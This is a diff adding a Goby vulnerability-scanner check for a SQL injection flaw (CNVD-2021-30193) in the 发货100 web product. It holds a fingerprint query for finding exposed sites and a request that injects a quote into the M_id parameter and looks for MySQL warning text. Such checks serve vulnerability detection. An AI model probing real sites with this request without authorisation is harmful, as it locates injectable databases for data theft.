@@ -1,0 +1,53 @@
+{
+      "Name": "fahuo100_sql_injection_CNVD_2021_30193",
+      "Level": "3",
+      "Tags": [
+            "SQL Injection"
+      ],
+      "GobyQuery": "header=\"Cache-Control: no-store, no-cache\"",
+      "Description": "发货100 M_id参数存在SQL注入漏洞， 攻击者通过漏洞可以获取数据库敏感信息",
+      "Product": "发货100",
+      "Homepage": "https://www.fahuo100.cn/",
+      "Author": "gobysec@gmail.com",
+      "Impact": "",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/?M_id=1'&type=product",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "mysql",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Warning",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-06-03 22:27:28",
+      "GobyVersion": "1.8.268"
+}
